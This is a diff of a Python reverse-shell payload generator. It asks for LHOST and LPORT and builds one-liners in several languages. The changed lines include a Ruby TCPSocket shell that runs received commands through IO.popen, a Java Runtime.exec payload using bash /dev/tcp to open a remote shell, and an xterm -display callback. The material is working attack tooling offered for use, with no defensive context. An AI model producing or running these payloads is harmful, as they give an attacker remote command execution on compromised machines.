@@ -30,7 +30,7 @@ def menu():
                 print("    [6] NETCAT script")
                 print("    [7] JAVA script")
                 print("    [8] XTERM script")
-                choice = input("[*] Please select your choice => ")
+                choice = input("[*] Please select your choice => ")                
                 ip = input("[*] Set LHOST: ")
                 port = input("[*] Set LPORT: ")
                 if choice == "1":
@@ -75,8 +75,9 @@ def php():
                 shGen(script)
                 print(script)
 
-def ruby():                                
-                script = "ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'"
+def ruby():                                                
+                ipAddress='"'+ip+'"'
+                script="ruby -rsocket -e 'exit if fork;c=TCPSocket.new("+ipAddress+","+port+");"+'while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
                 shGen(script)
                 print(script)
 
@@ -86,20 +87,20 @@ def netcat():
                 print(script)
 
 def java():
-                  
+                
                 script1 = "r = Runtime.getRuntime()"
                 script2 = "p = r.exec(["+"/bin/bash","-c","exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5;"
                 script3 = '"done"] as String[])"'
                 script4 = 'p.waitFor()'
-                print(type(script1))
+                print(script1)
                 print(script2)
                 print(script3)
                 print(script4)
-                script=str(script1)+'\n'+str(script2)+'\n'+str(script3)+'\n'+str(script4)+'\n'
+                script=str(script1)+'\n'+str(script2)+'\n'+str(script3)+'\n'+str(script4)+'\n'                
                 shGen(script)
 def xterm():
 
-                script = "xterm -display"+ip+":"+port+""
+                script = "xterm -display "+ip+":"+port+""
                 shGen(script)
                 print(script)
 
